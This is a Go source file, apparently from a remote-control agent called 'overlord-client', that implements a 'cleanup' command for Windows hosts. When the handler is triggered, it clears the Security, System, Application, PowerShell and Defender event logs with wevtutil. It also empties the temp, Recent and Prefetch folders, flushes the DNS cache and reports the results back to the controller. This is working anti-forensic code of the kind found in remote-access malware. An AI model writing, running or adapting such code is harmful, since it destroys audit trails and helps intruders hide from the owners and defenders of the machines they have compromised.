//go:build windows

package handlers

import (
	"context"
	"os"
	"os/exec"
	"path/filepath"

	rt "overlord-client/cmd/agent/runtime"
	"overlord-client/cmd/agent/wire"
)

func HandleCleanup(ctx context.Context, env *rt.Env, cmdID string) error {
	var cleared, errs []string

	// Event logs
	for _, l := range []string{
		"Security",
		"System",
		"Application",
		"Microsoft-Windows-PowerShell/Operational",
		"Microsoft-Windows-Defender/Operational",
		"Windows PowerShell",
	} {
		if err := exec.Command("wevtutil", "cl", l).Run(); err == nil {
			cleared = append(cleared, "eventlog:"+l)
		} else {
			errs = append(errs, "eventlog:"+l+": "+err.Error())
		}
	}

	// Temp directories
	for _, dir := range []string{
		os.Getenv("TEMP"),
		os.Getenv("TMP"),
		`C:\Windows\Temp`,
	} {
		if dir == "" {
			continue
		}
		n := clearDirContents(dir)
		if n > 0 {
			cleared = append(cleared, "temp:"+dir)
		}
	}

	// Recent files
	recentDir := filepath.Join(os.Getenv("APPDATA"), `Microsoft\Windows\Recent`)
	if n := clearDirContents(recentDir); n > 0 {
		cleared = append(cleared, "recent files")
	}

	// Prefetch
	if n := clearDirContents(`C:\Windows\Prefetch`); n > 0 {
		cleared = append(cleared, "prefetch")
	}

	// DNS cache
	if err := exec.Command("ipconfig", "/flushdns").Run(); err == nil {
		cleared = append(cleared, "dns cache")
	} else {
		errs = append(errs, "dns cache: "+err.Error())
	}

	return wire.WriteMsg(ctx, env.Conn, wire.CleanupResult{
		Type:      "cleanup_result",
		CommandID: cmdID,
		OK:        true,
		Cleared:   cleared,
		Errors:    errs,
	})
}

// clearDirContents removes all files and subdirs inside dir (not dir itself).
// Returns the number of entries successfully removed.
func clearDirContents(dir string) int {
	entries, err := os.ReadDir(dir)
	if err != nil {
		return 0
	}
	n := 0
	for _, e := range entries {
		path := filepath.Join(dir, e.Name())
		if e.IsDir() {
			if os.RemoveAll(path) == nil {
				n++
			}
		} else {
			if os.Remove(path) == nil {
				n++
			}
		}
	}
	return n
}
